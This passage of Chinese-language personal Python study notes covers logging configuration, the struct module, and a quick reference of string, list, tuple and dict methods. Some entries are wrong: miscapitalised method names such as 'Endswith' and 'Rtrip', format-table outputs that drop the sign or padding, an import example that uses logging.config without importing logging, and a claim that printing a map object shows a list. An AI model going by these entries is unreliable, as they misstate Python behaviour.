                    datefmt='%Y-%m-%d %H:%M:%S %p',)

ch=logging.StreamHandler()
ch.setFormatter(formatter)


logger1=logging.getLogger('root')
logger2=logging.getLogger('root.child1')
logger3=logging.getLogger('root.child1.child2')


logger1.addHandler(ch)
logger2.addHandler(ch)
logger3.addHandler(ch)
logger1.setLevel(10)
logger2.setLevel(10)
logger3.setLevel(10)

logger1.debug('log1 debug')
logger2.debug('log2 debug')
logger3.debug('log3 debug')
'''
2017-07-28 22:22:05 PM - root - DEBUG -test:  log1 debug
2017-07-28 22:22:05 PM - root.child1 - DEBUG -test:  log2 debug
2017-07-28 22:22:05 PM - root.child1 - DEBUG -test:  log2 debug
2017-07-28 22:22:05 PM - root.child1.child2 - DEBUG -test:  log3 debug
2017-07-28 22:22:05 PM - root.child1.child2 - DEBUG -test:  log3 debug
2017-07-28 22:22:05 PM - root.child1.child2 - DEBUG -test:  log3 debug
'''
```

### 14.8  应用

#### 14.8.1  logging配置

```python
"""
logging配置
"""

import os
import logging.config

# 定义三种日志输出格式 开始

standard_format = '[%(asctime)s][%(threadName)s:%(thread)d][task_id:%(name)s][%(filename)s:%(lineno)d]' \
                  '[%(levelname)s][%(message)s]' #其中name为getlogger指定的名字

simple_format = '[%(levelname)s][%(asctime)s][%(filename)s:%(lineno)d]%(message)s'

id_simple_format = '[%(levelname)s][%(asctime)s] %(message)s'

# 定义日志输出格式 结束

logfile_dir = os.path.dirname(os.path.abspath(__file__))  # log文件的目录

logfile_name = 'all2.log'  # log文件名

# 如果不存在定义的日志目录就创建一个
if not os.path.isdir(logfile_dir):
    os.mkdir(logfile_dir)

# log文件的全路径
logfile_path = os.path.join(logfile_dir, logfile_name)

# log配置字典
LOGGING_DIC = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'standard': {
            'format': standard_format
        },
        'simple': {
            'format': simple_format
        },
    },
    'filters': {},
    'handlers': {
        #打印到终端的日志
        'console': {
            'level': 'DEBUG',
            'class': 'logging.StreamHandler',  # 打印到屏幕
            'formatter': 'simple'
        },
        #打印到文件的日志,收集info及以上的日志
        'default': {
            'level': 'DEBUG',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件
            'formatter': 'standard',
            'filename': logfile_path,  # 日志文件
            'maxBytes': 1024*1024*5,  # 日志大小 5M
            'backupCount': 5,
            'encoding': 'utf-8',  # 日志文件的编码，再也不用担心中文log乱码了
        },
    },
    'loggers': {
        #logging.getLogger(__name__)拿到的logger配置
        '': {
            'handlers': ['default', 'console'],  # 这里把上面定义的两个handler都加上，即log数据既写入文件又打印到屏幕
            'level': 'DEBUG',
            'propagate': True,  # 向上（更高level的logger）传递
        },
    },
}


def load_my_logging_cfg():
    logging.config.dictConfig(LOGGING_DIC)  # 导入上面定义的logging配置
    logger = logging.getLogger(__name__)  # 生成一个log实例
    logger.info('It works!')  # 记录该文件的运行状态

if __name__ == '__main__':
    load_my_logging_cfg()
```

#### 14.8.2  使用

```Python
"""
MyLogging Test
"""

import time
import logging
import my_logging  # 导入自定义的logging配置

logger = logging.getLogger(__name__)  # 生成logger实例


def demo():
    logger.debug("start range... time:{}".format(time.time()))
    logger.info("中文测试开始。。。")
    for i in range(10):
        logger.debug("i:{}".format(i))
        time.sleep(0.2)
    else:
        logger.debug("over range... time:{}".format(time.time()))
    logger.info("中文测试结束。。。")

if __name__ == "__main__":
    my_logging.load_my_logging_cfg()  # 在你程序文件的入口加载自定义logging配置
    demo()
```

#### 14.8.3 注意注意注意

```Python
"""
MyLogging Test
"""

import time
import logging
import my_logging  # 导入自定义的logging配置

logger = logging.getLogger(__name__)  # 生成logger实例


def demo():
    logger.debug("start range... time:{}".format(time.time()))
    logger.info("中文测试开始。。。")
    for i in range(10):
        logger.debug("i:{}".format(i))
        time.sleep(0.2)
    else:
        logger.debug("over range... time:{}".format(time.time()))
    logger.info("中文测试结束。。。")

if __name__ == "__main__":
    my_logging.load_my_logging_cfg()  # 在你程序文件的入口加载自定义logging配置
    demo()
```

#### 14.8.4 另外一个django的配置，瞄一眼就可以，跟上面的一样

```Python
#logging_config.py
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'standard': {
            'format': '[%(asctime)s][%(threadName)s:%(thread)d][task_id:%(name)s][%(filename)s:%(lineno)d]'
                      '[%(levelname)s][%(message)s]'
        },
        'simple': {
            'format': '[%(levelname)s][%(asctime)s][%(filename)s:%(lineno)d]%(message)s'
        },
        'collect': {
            'format': '%(message)s'
        }
    },
    'filters': {
        'require_debug_true': {
            '()': 'django.utils.log.RequireDebugTrue',
        },
    },
    'handlers': {
        #打印到终端的日志
        'console': {
            'level': 'DEBUG',
            'filters': ['require_debug_true'],
            'class': 'logging.StreamHandler',
            'formatter': 'simple'
        },
        #打印到文件的日志,收集info及以上的日志
        'default': {
            'level': 'INFO',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件，自动切
            'filename': os.path.join(BASE_LOG_DIR, "xxx_info.log"),  # 日志文件
            'maxBytes': 1024 * 1024 * 5,  # 日志大小 5M
            'backupCount': 3,
            'formatter': 'standard',
            'encoding': 'utf-8',
        },
        #打印到文件的日志:收集错误及以上的日志
        'error': {
            'level': 'ERROR',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件，自动切
            'filename': os.path.join(BASE_LOG_DIR, "xxx_err.log"),  # 日志文件
            'maxBytes': 1024 * 1024 * 5,  # 日志大小 5M
            'backupCount': 5,
            'formatter': 'standard',
            'encoding': 'utf-8',
        },
        #打印到文件的日志
        'collect': {
            'level': 'INFO',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件，自动切
            'filename': os.path.join(BASE_LOG_DIR, "xxx_collect.log"),
            'maxBytes': 1024 * 1024 * 5,  # 日志大小 5M
            'backupCount': 5,
            'formatter': 'collect',
            'encoding': "utf-8"
        }
    },
    'loggers': {
        #logging.getLogger(__name__)拿到的logger配置
        '': {
            'handlers': ['default', 'console', 'error'],
            'level': 'DEBUG',
            'propagate': True,
        },
        #logging.getLogger('collect')拿到的logger配置
        'collect': {
            'handlers': ['console', 'collect'],
            'level': 'INFO',
        }
    },
}


# -----------
# 用法:拿到俩个logger

logger = logging.getLogger(__name__) #线上正常的日志
collect_logger = logging.getLogger("collect") #领导说,需要为领导们单独定制领导们看的日志
```

### 14.9 直奔主题，常规使用 

#### 14.9.1 日志级别与配置

```python
import logging
# 在
# 一：日志配置
logging.basicConfig(
    # 1、日志输出位置：1、终端 2、文件
    # filename='access.log', # 不指定，默认打印到终端

    # 2、日志格式
    format='%(asctime)s - %(name)s - %(levelname)s -%(module)s:  %(message)s',

    # 3、时间格式
    datefmt='%Y-%m-%d %H:%M:%S %p',

    # 4、日志级别
    # critical => 50
    # error => 40
    # warning => 30
    # info => 20
    # debug => 10
    level=30,
)

# 二：输出日志
logging.debug('调试debug')
logging.info('消息info')
logging.warning('警告warn')
logging.error('错误error')
logging.critical('严重critical')

'''
# 注意下面的root是默认的日志名字
WARNING:root:警告warn
ERROR:root:错误error
CRITICAL:root:严重critical
'''
```

#### 14.9.2  日志配置字典（setting.py）

```python
"""
logging配置
在 setting.py中定义
"""

import os

# 1、定义三种日志输出格式，日志中可能用到的格式化串如下
# %(name)s Logger的名字
# %(levelno)s 数字形式的日志级别
# %(levelname)s 文本形式的日志级别
# %(pathname)s 调用日志输出函数的模块的完整路径名，可能没有
# %(filename)s 调用日志输出函数的模块的文件名
# %(module)s 调用日志输出函数的模块名
# %(funcName)s 调用日志输出函数的函数名
# %(lineno)d 调用日志输出函数的语句所在的代码行
# %(created)f 当前时间，用UNIX标准的表示时间的浮 点数表示
# %(relativeCreated)d 输出日志信息时的，自Logger创建以 来的毫秒数
# %(asctime)s 字符串形式的当前时间。默认格式是 “2003-07-08 16:49:45,896”。逗号后面的是毫秒
# %(thread)d 线程ID。可能没有
# %(threadName)s 线程名。可能没有
# %(process)d 进程ID。可能没有
# %(message)s用户输出的消息

# 2、强调：其中的%(name)s为getlogger时指定的名字
## 这些是预先定义好的自定义格式
standard_format = '[%(asctime)s][%(threadName)s:%(thread)d][task_id:%(name)s][%(filename)s:%(lineno)d]' \
                  '[%(levelname)s][%(message)s]'

simple_format = '[%(levelname)s][%(asctime)s][%(filename)s:%(lineno)d]%(message)s'

test_format = '%(asctime)s] %(message)s'

# 3、日志配置字典
LOGGING_DIC = {
    'version': 1,
    'disable_existing_loggers': False,
    
    'formatters': {
        # 自己自定义的日志格式，可以自己改
        'standard': {
            # 自己定义的自定义格式
            'format': standard_format
        },
        'simple': {
            'format': simple_format
        },
        'test': {
            'format': test_format
        },
    },
    
    'filters': {},
    
    ## 日志的接受者，不同的handle可以使日志输出到不同位置
    'handlers': {
        #打印到终端的日志
        'console': {
            'level': 'DEBUG',
            'class': 'logging.StreamHandler',  # 打印到屏幕
            ## 指定输出格式
            'formatter': 'simple'
        },
        
        #打印到文件的日志,收集info及以上的日志
        'default': {
            'level': 'DEBUG',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件,日志轮转
            'formatter': 'standard',
            # 可以定制日志文件路径
            # BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # log文件的目录
            # LOG_PATH = os.path.join(BASE_DIR,'a1.log')
            'filename': 'a1.log',  # 日志文件
            'maxBytes': 1024*1024*5,  # 日志大小 5M
            'backupCount': 5,
            'encoding': 'utf-8',  # 日志文件的编码，再也不用担心中文log乱码了
        },
        
        ## 测试用的日志格式
        'other': {
            'level': 'DEBUG',
            'class': 'logging.FileHandler',  # 保存到文件
            'formatter': 'test',
            'filename': 'a2.log',##拿到项目的跟文件夹 os.path.dirname(os.path.dirname(__file__))
            'encoding': 'utf-8',
        },
    },
    
    # 负责产生日志，产生的日志传递给handler负责处理
    'loggers': {
        #logging.getLogger(__name__)拿到的logger配置
        'kkk': {
            #  kkk 产生的日志传给谁
            'handlers': ['default', 'console'],  # 这里把上面定义的两个handler都加上，即log数据既写入文件又打印到屏幕
            'level': 'DEBUG', # loggers(第一层日志级别关限制)--->handlers(第二层日志级别关卡限制)
            'propagate': False,  # 默认为True，向上（更高level的logger）传递，通常设置为False即可，否则会一份日志向上层层#  传递
        },
        
        'bbb': {
            #  kkk 产生的日志传给谁
            'handlers': ['console'],  # 这里把上面定义的两个handler都加上，即log数据既写入文件又打印到屏幕
            'level': 'DEBUG', # loggers(第一层日志级别关限制)--->handlers(第二层日志级别关卡限制)
            'propagate': False,  # 默认为True，向上（更高level的logger）传递，通常设置为False即可，否则会一份日志向上层层#  传递
        },
        '专门的采集': {
            'handlers': ['other',],
            'level': 'DEBUG',
            'propagate': False,
        },
    },
}
```

#### 14.9.3 使用

```python
import settings

# !!!强调!!!
# 1、logging是一个包，需要使用其下的config、getLogger，可以如下导入
# 可能不能正常使用
# import logging.config 
# import logging.getLogger  

# 2、也可以使用如下导入
# from logging import config,getLogger 

from logging import config # 这样连同logging.getLogger都一起导入了,然后使用前缀logging.config.
from logging import getLogger # 用于获取配置文件里的日志生产者

# 3、加载配置
# 把配置好的配置字典扔进去
logging.config.dictConfig(settings.LOGGING_DIC)

logger1 = getLogger("kkk")  ## kkk 是可以同时向终端和文件里输出日志的
logger2 = getLogger('bbb')  ### bbb 只向终端里输出日志

# 4、输出日志
logger1=logging.getLogger('用户交易')
logger1.info('egon儿子alex转账3亿冥币')

# logger2=logging.getLogger('专门的采集') # 名字传入的必须是'专门的采集'，与LOGGING_DIC中的配置唯一对应
# logger2.debug('专门采集的日志')
```

#### 14.9.4 日志轮换

```python
   ## 'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件,日志轮转
   ## 'maxBytes': 1024*1024*5,  # 日志大小 5M
   ##  'backupCount': 5,  最多保运几份

    #打印到文件的日志,收集info及以上的日志
        'default': {
            'level': 'DEBUG',
            'class': 'logging.handlers.RotatingFileHandler',  # 保存到文件,日志轮转
            'formatter': 'standard',
            # 可以定制日志文件路径
            # BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # log文件的目录
            # LOG_PATH = os.path.join(BASE_DIR,'a1.log')
            'filename': 'a1.log',  # 日志文件
            'maxBytes': 1024*1024*5,  # 日志大小 5M
            'backupCount': 5,
            'encoding': 'utf-8',  # 日志文件的编码，再也不用担心中文log乱码了
        },
```

### 15，struct模块

```python
## 该模块可以把一个类型，如数字，转成固定长度的bytes
import struct
bytes = struct.pack('i',1000) ## 拿到长度固定的四个字节
num = struct.unpack('i',bytes)[0]   ## 结果是元祖，元祖里拿到数字拿到数字
```

![image-20230706121238062](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230706121238062.png)

# 三，常用API速查

## 1，字符串

### 1.1 字符串查找方法

```Python
    startswith() #以指定字符串开头；
   	Endswith() # 以指定字符串结尾；
    find() # 返回字符串第一次出现的位置；
    Rfind() # 返回最后一次出现的位置；
    Count() # 返回某个字符总共出现的次数；
    Isallnum() # 判断所有字符是不是全是数字或者字母；    
```

### 2.2  去除首位信息

```python
    Strip() # 去除字符串首位指定信息； 默认去除首位空格
    Lstrip() # 去除左边的指定信息；
    Rtrip() # 去除右边的指定信息；   
```

### 3.3 大小写转换

```python
 	Capitalize() # 产生新的字符串，首字母大写；
    Title() # 每个单词首字母大写；
    Upper() # 所有字母转换成大写；
    Lower() # 所有字母转换成小写；
    Swapcase() # 所有字母大小写转换；
```

### 4.4 格式排版：

```python
    # 1. Center() ljust() rjust() 用于实现排版；
    # 默认用空格填充
    # 2. 接受两个参数，第一个参数是要实现的长度，第二个字符是要填充的字符
    s = "aini"
    s.center(10,"*")  # 用*左右填充让s达到10的长度
    
    # 格式化
    "我是{0},我喜欢数字{1:*^8}".format("艾尼","666")
    # ：后面是依次是 填充的字符 对齐方式(<^> 左中右) 格式化长度
    #  如：1:*^20 用*号居中对齐，长度为 20 个字符

	# 数字格式化
    
```

### 5.5 数字格式化

| 数字      | 格式      | 输出        | 描述                         |
| :-------- | :-------- | ----------- | ---------------------------- |
| 3.1415926 | { :.2f }  | 3.14        | 保留小数点后两位             |
| 3.1415926 | { :+.2f } | 3.14        | 带符号的保留小数点后两位     |
| 2.71828   | { :.0f }  | 3           | 不带小数                     |
| 5         | { :0>2d } | 5           | 数字补零（填充左边，宽度为2) |
| 5         | { :x<4d } | 5xxx        | 数字补x（填充右边，宽度为4)  |
| 10        | { :x<4d } | 10xx        | 数字补x（填充右边，宽度为4)  |
| 1000000   | { :, }    | 1，000，000 | 以逗号分割的数字形式         |
| 0.25      | { :.2% }  | 25.00%      | 百分比格式                   |

### 6.6 其他方法：

```Python
    Isalnum() # 是否全为数字或字母；
    Isalpha() # 是不是都是字母或汉字组成；
    Isdigit() # 是不是都是由数字组成；
    Isspace() # 检测是否为空白字符；
    Isupper() # 检测是否为大写字母；
    Islower() # 检测是否为小写字母；
```

## 2，列表

| 方法                 | 要点         | 描述                                                |
| :------------------- | :----------- | --------------------------------------------------- |
| list.append(x)       | 增加元素     | 将元素x增加到列表list尾部                           |
| list.extend(aList)   | 增加元素     | 将列表aList素有元素加到列表list尾部                 |
| list.insert(index,x) | 增加元素     | 将列表list指定index处插入元素x                      |
| list.remove(x)shan   | 删除元素     | 删除列表中首次出现的指定元素x                       |
| list.pop(index)      | 删除元素     | 删除index处的元素并返回，默认删除最后一个元素并返回 |
| list.clear()         | 删除所有元素 | 删除原数，不会删除列表对象                          |
| list.index(x)        | 访问元素     | 返回第一个x的索引，若不存在则抛出异常               |
| list.count(x)        | 计数         | 返回元素x在列表中出现的次数                         |
| len(list)            | 返回列表长度 | 返回类表中总元素的个数                              |

| 方法           | 要点     | 描述                 |
| :------------- | :------- | -------------------- |
| list.reverse() | 翻转列表 | 所有元素原地翻转     |
| list.sort()    | 排序     | 所有元素原地排序     |
| list.copy()    | 浅拷贝   | 返回列表对象的浅拷贝 |

## 3，字典

```python 
# update(),把第二个字典加到第一个字典里面
a.update(b) # 把字典b加到a里面

# 可以用 del 删除键值对
 # Del a[‘name’] del a[‘sex’]
    
# 可以用 clear()方法删除所有键值对；
# Pop()方法可以删除键值对，并将值返回
a.pop("name")

# Popitem()方法:随机删除键值对，并将其返回

# 序列解包
a.values()
a.items()
```

## 4，Python常用内置函数

###  4.1  round() 函数

round()是一个处理数值的内置函数，它返回浮点数x的四舍五入值

### 4.2 all() 和 any()

all()和any()，用于判断可迭代对象中的元素是否为True。它们返回布尔值True或False

```Python
numbers = [1, 2, 3, 4, 5]
if all(num > 0 for num in numbers):
    print("All numbers are positive")
else:
    print("There are some non-positive numbers")

if any(num > 4 for num in numbers):
    print("At least one number is greater than 4")
else:
    print("No number is greater than 4")

```

### 4.3 lambda函数

```Python
lambda x: x + 5
这个Lambda函数可以像下面这样使用：
add_five = lambda x: x + 5
result = add_five(10)
print(result)   # 输出 15

```

### 4.4 sorted()函数

sorted()是一个内置函数，它用于对可迭代对象进行排序。
sorted()函数接受一个可迭代对象作为参数，并返回一个新的已排序的列表。

```Python
sorted(iterable, key=None, reverse=False)
# iterable: 需要排序的可迭代对象，例如列表、元组、集合、字典等。
#key（可选参数）: 用于指定排序的关键字。key是一个函数，它将作用于iterable中的每个元素，并返回一个用于排序的关键字。默认为None，表示按照元素的大小进行排序。
# reverse（可选参数）: 用于指定排序的顺序。如果设置为True，则按照逆序排序。默认为False，表示按照正序排序。

```

```python
numbers = [3, 1, 4, 1, 5, 9, 2, 6, 5, 3, 5]
sorted_numbers = sorted(numbers)
print(sorted_numbers)  # 输出结果为 [1, 1, 2, 3, 3, 4, 5, 5, 5, 6, 9]

words = ["apple", "banana", "cherry", "date"]
sorted_words = sorted(words, key=len)
print(sorted_words)  # 输出结果为 ["date", "apple", "banana", "cherry"]

numbers = [(1, 2), (3, 4), (2, 1), (4, 3)]
sorted_numbers = sorted(numbers, key=lambda x: x[1])
print(sorted_numbers)  # 输出结果为 [(2, 1), (1, 2), (4, 3), (3, 4)]
# 在上面的示例中，第一个示例对一个整数列表进行排序，第二个示例对一个字符串列表按照字符串长度进行排序，第三个示例对一个元组列表按照元组中第二个元素进行排序，其中使用了lambda表达式作为key参数来指定排序方式。

```

### 4.5 map()函数

```Python
map(函数名，可迭代对象) 
map函数是一种高阶函数，它接受一个函数和一个可迭代对象作为参数，返回一个新的可迭代对象，
map得到的是一个迭代器
# 其中每个元素都是将原可迭代对象中的元素应用给定函数后的结果。
# 可以简单理解为对可迭代对象中的每个元素都执行同一个操作，返回一个新的结果集合。
# 需要注意的是，map函数返回的是一个迭代器对象，因此如果要使用它的结果，需要将它转换为一个列表list()、元组tuple()或集合set()和其他可迭代对象。

map函数的一些应用
1.用来批量接收变量
n,m = map(int,input().split())

2.对可迭代对象进行批量处理返回列表map
m = map("".join,[["a","b","c"],["d","e","f"]])
print(m) -> ["abc","def"]

3.配合lambda函数达到自己想要的效果
numbers = [1, 2, 3, 4, 5]
doubled_numbers = map(lambda x: x * 2, numbers)
print(list(doubled_numbers))  -> [2, 4, 6, 8, 10]

```

### 4.5 filter()函数

filter() 函数是 Python 内置函数之一，它用于过滤序列中的元素，返回一个满足条件的新序列。

filter() 函数的语法如下：

```python
my_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
result = filter(lambda x: x % 2 == 0, my_list)
print(list(result))  # 输出 [2, 4, 6, 8, 10]
在这个例子中，lambda x: x % 2 == 0 是一个 lambda 函数，用于判断一个数是否为偶数。filter() 函数将这个 lambda 函数作为参数，对列表 my_list 进行过滤，最后返回一个新列表，其中包含 my_list 中所有的偶数。

```

### 4.6 ASCII码的函数

```python
ord() # 接收字符转换ASCII码
chr() # 接收ASCII码转换字符
```

### 4.7 转进制函数

```python
# 其它进制通用转10进制
int("x",y) # x是你要转的数，而y是这个数是由什么进制表示的，
# 当y为0时就按x的前缀来看如 0bx 二进制,0b 0o 0x,分别是二，八，十六

#  10进制转其他进制
hex() # 转16
oct() # 转8

# 有一个函数很适合10进制转其他各种进制
divmod(x,y)
#其作用是同时返回两个数的商和余数。
# 所以要这样接收它的值 a,b = divmod(x,y)

```

### 4.8 列表

```python
Python中的list是一个非常重要的数据类型，可以用来存储多个值，包括数字、字符串、对象等等。
以下是一些常见的list函数及其示例：

append() - 将一个元素添加到list的末尾
fruits = ['apple', 'banana', 'cherry']
fruits.append('orange')
print(fruits) # ['apple', 'banana', 'cherry', 'orange']

extend() - 将一个list的所有元素添加到另一个list的末尾
fruits = ['apple', 'banana', 'cherry']
more_fruits = ['orange', 'mango', 'grape']
fruits.extend(more_fruits)
print(fruits) # ['apple', 'banana', 'cherry', 'orange', 'mango', 'grape']

insert() - 在指定的位置插入一个元素
fruits = ['apple', 'banana', 'cherry']
fruits.insert(1, 'orange')
print(fruits) # ['apple', 'orange', 'banana', 'cherry']

remove() - 删除指定的元素
fruits = ['apple', 'banana', 'cherry']
fruits.remove('banana')
print(fruits) # ['apple', 'cherry']

pop() - 删除指定位置的元素（默认为最后一个元素），并返回该元素的值
fruits = ['apple', 'banana', 'cherry']
last_fruit = fruits.pop()
print(last_fruit) # 'cherry'
print(fruits) # ['apple', 'banana']

index() - 返回指定元素在list中的索引位置
fruits = ['apple', 'banana', 'cherry']
banana_index = fruits.index('banana')
print(banana_index) # 1

count() - 返回指定元素在list中出现的次数
fruits = ['apple', 'banana', 'cherry', 'banana', 'banana']
banana_count = fruits.count('banana')
print(banana_count) # 3

sort() - 将list中的元素进行排序
fruits = ['apple', 'banana', 'cherry']
fruits.sort()
print(fruits) # ['apple', 'banana', 'cherry']

reverse() - 将list中的元素翻转
fruits = ['apple', 'banana', 'cherry']
fruits.reverse()
print(fruits) # ['cherry', 'banana', 'apple']

len() - 返回list中元素的数量
fruits = ['apple', 'banana', 'cherry']
num_fruits = len(fruits)
print(num_fruits) # 3

copy() - 返回一个list的副本
fruits = ['apple', 'banana', 'cherry']
fruits_copy = fruits.copy()
print(fruits_copy) # ['apple', 'banana', 'cherry']

clear() - 删除list中的所有元素
fruits = ['apple', 'banana', 'cherry']
fruits.clear()
print(fruits) # []

max() - 返回list中最大的元素
numbers = [5, 10, 3, 8, 15]
max_num = max(numbers)
print(max_num) # 15

min() - 返回list中最小的元素
numbers = [5, 10, 3, 8, 15]
min_num = min(numbers)
print(min_num) # 3

sum() - 返回list中所有元素的和（仅适用于数字类型的list）
numbers = [5, 10, 3, 8, 15]
sum_nums = sum(numbers)
print(sum_nums) # 41

any() - 如果list中至少有一个元素为True，则返回True
bool_list = [False, True, False]
has_true = any(bool_list)
print(has_true) # True

all() - 如果list中的所有元素都为True，则返回True
bool_list = [True, True, True]
all_true = all(bool_list)
print(all_true) # True

enumerate() - 返回一个枚举对象，其中包含list中每个元素的索引和值
fruits = ['apple', 'banana', 'cherry']
for index, fruit in enumerate(fruits):
    print(index, fruit)
# 0 apple
# 1 banana
# 2 cherry


map() - 对list中的每个元素应用函数，并返回结果的list
numbers = [1, 2, 3, 4]
squares = list(map(lambda x: x ** 2, numbers))
print(squares) # [1, 4, 9, 16]

filter() - 返回list中符合条件的元素的子集
numbers = [1, 2, 3, 4, 5, 6]
even_nums = list(filter(lambda x: x % 2 == 0, numbers))
print(even_nums) # [2, 4, 6]

reduce() - 对list中的元素应用函数，将其归约为单个值
from functools import reduce
numbers = [1, 2, 3, 4]
sum_nums = reduce(lambda x, y: x + y, numbers)
print(sum_nums) # 10

zip() - 将多个list的元素配对，返回一个元组的list
fruits = ['apple', 'banana', 'cherry']
colors = ['red', 'yellow', 'red']
fruit_colors = list(zip(fruits, colors))
print(fruit_colors) # [('apple', 'red'), ('banana', 'yellow'), ('cherry', 'red')]

sorted() - 返回一个新的已排序的list
numbers = [3, 2, 1, 5, 4]
sorted_nums = sorted(numbers)
print(sorted_nums) # [1, 2, 3, 4, 5]

join() - 将list中的字符串连接成一个字符串
fruits = ['apple', 'banana', 'cherry']
fruit_string = ', '.join(fruits)
print(fruit_string) # 'apple, banana, cherry'

slice() - 返回一个list的子集，根据索引的起始和结束位置
fruits = ['apple', 'banana', 'cherry', 'orange', 'grape']
subset = fruits[1:4]
print(subset) # ['banana', 'cherry', 'orange']

希望这些函数能够帮助你更好地使用Python的list类型。

```

### 4.9 元祖

```Python
Python元组是不可变序列，它不支持在原地修改元素。因此，Python元组的函数相对较少。
以下是Python元组的所有函数：
count
count方法返回元组中指定元素的数量。
my_tuple = ('apple', 'banana', 'apple', 'orange', 'banana', 'apple')
count = my_tuple.count('apple')
print(count)  # 输出：3

index
index方法返回元组中指定元素第一次出现的索引。
my_tuple = ('apple', 'banana', 'apple', 'orange', 'banana', 'apple')
index = my_tuple.index('orange')
print(index)  # 输出：3

len
len方法返回元组中元素的数量。
my_tuple = ('apple', 'banana', 'orange')
length = len(my_tuple)
print(length)  # 输出：3

tuple
tuple函数用于将一个可迭代对象转换为元组。
my_list = [1, 2, 3]
my_tuple = tuple(my_list)
print(my_tuple)  # 输出：(1, 2, 3)

zip
zip函数将多个可迭代对象的对应元素打包成元组，返回一个包含这些元组的迭代器。
fruits = ('apple', 'banana', 'orange')
quantities = (5, 2, 3)
prices = (1.2, 1.5, 0.8)
# 将三个元组打包成一个迭代器
inventory = zip(fruits, quantities, prices)
# 遍历迭代器中的元素
for item in inventory:
    print(item)
# 输出：
# ('apple', 5, 1.2)
# ('banana', 2, 1.5)
# ('orange', 3, 0.8)

sorted
sorted函数返回一个按指定顺序排序后的可迭代对象，可以接收一个关键字参数key来指定排序的关键字。
my_tuple = (3, 2, 1)
sorted_tuple = sorted(my_tuple)
print(sorted_tuple)  # 输出：[1, 2, 3]
# 按绝对值大小排序
my_tuple = (-3, 2, -1)
sorted_tuple = sorted(my_tuple, key=abs)
print(sorted_tuple)  # 输出：[-1, 2, -3]

reversed
reversed函数返回一个迭代器，包含按相反顺序排列的可迭代对象中的元素。
my_tuple = ('apple', 'banana', 'orange')
reversed_tuple = reversed(my_tuple)
for item in reversed_tuple:
    print(item)
# 输出：
# orange
# banana
# apple

继续
max
max函数返回可迭代对象中最大的元素，可以接收一个关键字参数key来指定比较的关键字。
my_tuple = (3, 2, 1)
max_element = max(my_tuple)
print(max_element)  # 输出：3
# 按绝对值大小比较
my_tuple = (-3, 2, -1)
max_element = max(my_tuple, key=abs)
print(max_element)  # 输出：-3

min
min函数返回可迭代对象中最小的元素，可以接收一个关键字参数key来指定比较的关键字。
my_tuple = (3, 2, 1)
min_element = min(my_tuple)
print(min_element)  # 输出：1
# 按绝对值大小比较
my_tuple = (-3, 2, -1)
min_element = min(my_tuple, key=abs)
print(min_element)  # 输出：-1

sum
sum函数返回可迭代对象中所有元素的和，可以接收一个可选参数start指定求和的起始值。
my_tuple = (3, 2, 1)
sum_value = sum(my_tuple)
print(sum_value)  # 输出：6
# 指定求和的起始值为5
my_tuple = (3, 2, 1)
sum_value = sum(my_tuple, 5)
print(sum_value)  # 输出：11

all
all函数返回可迭代对象中所有元素都为真值（即不为False、0、None等）时返回True，否则返回False。
my_tuple = (1, 2, 3)
result = all(my_tuple)
print(result)  # 输出：True
my_tuple = (1, 2, 0)
result = all(my_tuple)
print(result)  # 输出：False

any
any函数返回可迭代对象中至少有一个元素为真值（即不为False、0、None等）时返回True，否则返回False。
my_tuple = (0, False, None)
result = any(my_tuple)
print(result)  # 输出：False
my_tuple = (0, False, 1)
result = any(my_tuple)
print(result)  # 输出：True

```

### 4.10 字典

```Python
Python字典（dictionary）是一个无序的键值对集合。Python中有许多内置函数可以操作字典。
以下是一些常用的函数及其示例：

创建字典
# 创建一个空字典
my_dict = {}

# 创建一个非空字典
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}

访问字典
# 获取字典中指定键对应的值
value = my_dict['apple']
print(value)  # 输出：1

# 使用get()方法获取字典中指定键对应的值
value = my_dict.get('banana')
print(value)  # 输出：2

# 获取字典中所有键的列表
keys = list(my_dict.keys())
print(keys)  # 输出：['apple', 'banana', 'orange']

# 获取字典中所有值的列表
values = list(my_dict.values())
print(values)  # 输出：[1, 2, 3]

修改字典
# 修改字典中指定键对应的值
my_dict['apple'] = 4
print(my_dict)  # 输出：{'apple': 4, 'banana': 2, 'orange': 3}

# 使用update()方法修改字典中的值
my_dict.update({'apple': 5, 'orange': 6})
print(my_dict)  # 输出：{'apple': 5, 'banana': 2, 'orange': 6}

删除字典
# 删除字典中指定键值对
del my_dict['apple']
print(my_dict)  # 输出：{'banana': 2, 'orange': 6}

# 删除字典中所有键值对
my_dict.clear()
print(my_dict)  # 输出：{}

其他函数
# 获取字典中键值对的数量
num_items = len(my_dict)
print(num_items)  # 输出：0

# 检查字典中是否存在指定键
if 'apple' in my_dict:
    print('Yes')  # 输出：No

# 复制字典
new_dict = my_dict.copy()
print(new_dict)  # 输出：{}


遍历字典
# 遍历字典中所有键值对
for key, value in my_dict.items():
    print(key, value)

# 遍历字典中所有键
for key in my_dict.keys():
    print(key)

# 遍历字典中所有值
for value in my_dict.values():
    print(value)

设置默认值
# 使用setdefault()方法设置默认值
my_dict.setdefault('apple', 0)
print(my_dict)  # 输出：{'banana': 2, 'orange': 6, 'apple': 0}

合并字典
# 使用update()方法合并字典
dict1 = {'apple': 1, 'banana': 2}
dict2 = {'orange': 3, 'pear': 4}
dict1.update(dict2)
print(dict1)  # 输出：{'apple': 1, 'banana': 2, 'orange': 3, 'pear': 4}

# 使用**运算符合并字典
dict1 = {'apple': 1, 'banana': 2}
dict2 = {'orange': 3, 'pear': 4}
dict3 = {**dict1, **dict2}
print(dict3)  # 输出：{'apple': 1, 'banana': 2, 'orange': 3, 'pear': 4}

字典推导式
# 创建字典推导式
my_dict = {i: i*2 for i in range(5)}
print(my_dict)  # 输出：{0: 0, 1: 2, 2: 4, 3: 6, 4: 8}

反转字典
# 反转字典中的键值对
my_dict = {'apple': 1, 'banana': 2, 'orange': 3}
